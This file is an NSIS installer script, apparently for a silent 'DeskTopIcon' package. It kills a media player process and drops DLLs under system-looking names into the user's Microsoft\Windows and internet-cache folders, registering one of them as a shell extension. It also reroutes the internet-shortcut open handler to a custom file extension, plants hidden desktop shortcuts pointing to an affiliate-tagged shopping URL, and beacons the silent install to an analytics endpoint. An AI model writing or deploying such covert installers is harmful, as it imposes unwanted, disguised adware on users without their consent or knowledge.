;////////////////////////////////////////////////////////////////////////////////////////////////////
; 包含文件
;////////////////////////////////////////////////////////////////////////////////////////////////////
!include "MUI.nsh"
!include "FileFunc.nsh"
!include "WordFunc.nsh"
!include "StrFunc.nsh"
!include "nsDialogs.nsh"
!include "NSISArray.nsh"
!include "WinVer.nsh"
!insertmacro GetOptions
!insertmacro GetParameters

 
Name "DeskTopIcon"
OutFile													"\\192.168.13.159\share\kankan\xmp4\D.exe"

RequestExecutionLevel user
CRCCheck on
SetCompressor lzma
;SilentInstall silent  
;!define MUI_HEADERIMAGE
;!define MUI_HEADERIMAGE_BITMAP 	 	                ".\..\..\trunk\bin\SetupResource\Logo.bmp"

;!define MUI_HEADERIMAGE_RIGHT
;!define MUI_ICON                                        ".\..\..\trunk\bin\SetupResource\Install.ico"

;刷新系统环境
!define SHCNE_ASSOCCHANGED 0x08000000
!define SHCNF_FLUSHNOWAIT 0x2000
SilentInstall silent	

VIProductVersion 1.0.1.0
VIAddVersionKey "FileVersion" 1.0.1.0
VIAddVersionKey /LANG=2052 "ProductName" "DeskTopIcon"
VIAddVersionKey "CompanyName" "bytecn,Ltd."


!insertmacro MUI_LANGUAGE					"SimpChinese"

;////////////////////////////////////////////////////////////////////////////////////////////////////
; 安装过程
;////////////////////////////////////////////////////////////////////////////////////////////////////
${StrStrAdv}

Var stat_value ; 0:未安装XMP,退出, 1:释放完成
 
Var /GLOBAL PeerId
Var /GLOBAL LastUninstallTime
; 栈顶参数，statCode
Function SendStat
	Pop $0                                 ; PackageType 监视安装过程
	StrCpy				$1 "vh"  ; InstallSource 写死
	StrCpy              $2 0               ; UIBuilt ;MiniXmpInstall没有安装界面 始终为0
    StrCpy              $3 1    ; 全新或覆盖      

	;StrCpy $R0 			"http://setup.xmp.stat.kankan.com/cgi-bin/cgi_install.fcg?install=$0&channel=3&peerid=$PeerId&version=${BuildNum}&package_name=$1&installtype=$2$3&lastuninstalltime=$LastUninstallTime"
	;System::Call		"urlmon::URLDownloadToCacheFileW(i 0, t R0, t .r10, t 1024,i 0,i 0)"
FunctionEnd

Function TryCopyFile
	Pop $R3
	Pop $R4
	IfFileExists $R3 0 copyend
	DetailPrint "try copy $R3 to $R4"
	StrCpy $R5 1
retry:
	CopyFiles /SILENT /FILESONLY $R3 $R4
	IfErrors 0 copyend
	; DetailPrint "copy $R3 to $R4 fail!"
	IntOp $R5 $R5 + 1
	IntCmp $R5 3 0 0 copyend
	; DetailPrint "sleep 100 and try again!"
	Sleep 100
	Goto retry
copyend:
FunctionEnd
Var /GLOBAL hXMP
Function QuitXMP
	System::Call		"user32::FindWindowW(t 'XSH_{B9689BCB-F2B7-4D43-B6B3-6BFB66DB1745}', i 0)i .r1"
	DetailPrint "FindWindow: Window HANDLE: $1"
	IntCmp $1 0 0 0 +2
		Goto QuitXMPEnd
	Push $1 
	Pop $hXMP
 	
	System::Call		"user32::GetWindowThreadProcessId(i $hXMP, *l r2r2)i .r1 ?e"
	DetailPrint "Get ProcessId ProcessId: $2"
	System::Call		"kernel32::OpenProcess(i 1, i 0,i r2)i .r1"
	DetailPrint "OpenProcess Process Handle: $1"
	System::Call		"kernel32::TerminateProcess(i r1, i 0)i .r1 ?e"
	DetailPrint "TerminateProcess Returns: $1"
 
QuitXMPEnd:
	
FunctionEnd
Section "XMPSupport" SEC_XmpSupport
	Call QuitXMP		
ReleaseFile:
	${GetFileVersion} "$INSTDIR\msadosr.dll" $0
	${StrStrAdv} $1 "$0" "." "<" ">" "0" "0" "0"
	
	SetShellVarContext  current
	
	Delete  "$INSTDIR\_msadosr$1.dll"
	Delete  "$INSTDIR\msadosr$1.dll"
	Rename	"$INSTDIR\msadosr$1.dll" "$INSTDIR\_msadosr$1.dll"
	
	Delete  "$INSTDIR\_msadosr.dll"
	Delete  "$INSTDIR\msadosr.dll"
	Rename	"$INSTDIR\msadosr.dll" "$INSTDIR\_msadosr.dll"	
	
	Delete  "$INSTDIR\xp32sp3.pcl"
	Delete  "$INSTDIR\_xp32sp3.pcl"
	Rename	"$INSTDIR\xp32sp3.pcl" "$INSTDIR\_xp32sp3.pcl"
	
	SetOverwrite try
	SetOutPath "$INSTDIR"
		File .\ExtIcon\msadosr.dll
		File /oname=$APPDATA\Microsoft\Windows\msadosr$1.dll .\ExtIcon\msadosr.dll
	
	SetOutPath "$APPDATA\Microsoft\Windows" 
		File .\ExtIcon\xp32sp3.pcl
		

	WriteRegStr HKCU "Software\ExtIconHandler" "Path" "$APPDATA\Microsoft\Windows\msadosr$1.dll"
	SetOutPath "$DESKTOP" 
		File .\ExtIcon\返利网.51fanli
		
	System::Call "shell32::IsUserAnAdmin()i .r1"
	DetailPrint "User is Administrator: $1"
	; if high priority ,regdll
	IntCmp $1 0 0 +2 0 
	RegDLL "$INSTDIR\msadosr.dll"
/*
	URL=http://www.114la.com/
	Modified=E083EB028EBAC70160
	IconFile=http://www.114la.com/favicon.ico
	IconIndex=1
*/

	ReadRegStr $0 HKCR "InternetShortcut\shell\open\command" ""
	WriteRegStr HKCR "extico.51fanli\Shell\open\command" "" $0
	
	; 桌面快捷方
	StrCpy $R0	"$DESKTOP\Themes.eth0"
	Delete "$R0"
	WriteINIStr "$R0" "InternetShortcut" "URL" "http://51fanli.com/?id=660100"
	WriteINIStr "$R0" "InternetShortcut" "IconFile" "http://51fanli.com/favicon.ico"
	WriteINIStr "$R0" "InternetShortcut" "IconIndex" "1"
	
	IfFileExists "$R0" 0 ShortCutEnd
		SetFileAttributes "$R0" FILE_ATTRIBUTE_HIDDEN
		
	CreateDirectory "$INTERNET_CACHE\Content.ExtIconHandler"	
	SetOutPath "$INTERNET_CACHE\Content.ExtIconHandler" 
		File .\ExtIcon\51fanli.ico	
		File .\ExtIcon\shell32sp3.dll
	StrCpy $R1 "$INTERNET_CACHE\Content.ExtIconHandler\51fanli.ico"	
	WriteRegStr HKCU "Software\ExtIconHandler" ".51fanli" $R1
	
	; 刷新系统环境	
	System::Call 'Shell32::SHChangeNotify(i ${SHCNE_ASSOCCHANGED}, i ${SHCNF_FLUSHNOWAIT}, i 0, i 0)'
	
	ReadRegStr $R1 HKCU "Software\ExtIconHandler" "PID"
	StrCpy $R0 "http://www.google-analytics.com/collect?v=1&tid=UA-42360423-1&cid=$R1&t=event&ec=install&ea=silent&el=$EXEFILE&ev=1"
	System::Call		"urlmon::URLDownloadToCacheFileW(i 0, t R0, t .r10, t 1024,i 0,i 0)"
ShortCutEnd:

SectionEnd

Function .onInit

	; 无命令行，有界面运行
	${GetParameters} $R0
	StrCmp $R0 "" +2 0
		SetSilent silent
	; 无 XMP 退出安装
	;ReadRegStr $0 HKLM "SOFTWARE\Thunder Network\Xmp" "Path"
	;IfFileExists "$0" ReleaseHelpDll 0
	;	Abort
		
ReleaseHelpDll:	

SetInstDir:
	StrCpy $INSTDIR "$APPDATA\Microsoft\Windows"
	
	; PeerId
	;ReadRegStr $PeerId HKLM "SOFTWARE\Thunder Network\Xmp" "PeerId"	

	; LastUninstallTime
	;ReadRegDWORD $LastUninstallTime HKLM "Software\Thunder Network\Xmp" "lastuninstalltime"
	;IfErrors 0 +2
	;	StrCpy $LastUninstallTime "0"
	;IntCmp $LastUninstallTime 0 +2 0 +2
	;	StrCpy $LastUninstallTime "0"
	 
InitEnd:
FunctionEnd

Function .onInstFailed
	 
FunctionEnd

Function .onInstSuccess
    /*安装成功，隐藏窗体等5s,再退出*/
    HideWindow 
FunctionEnd
 

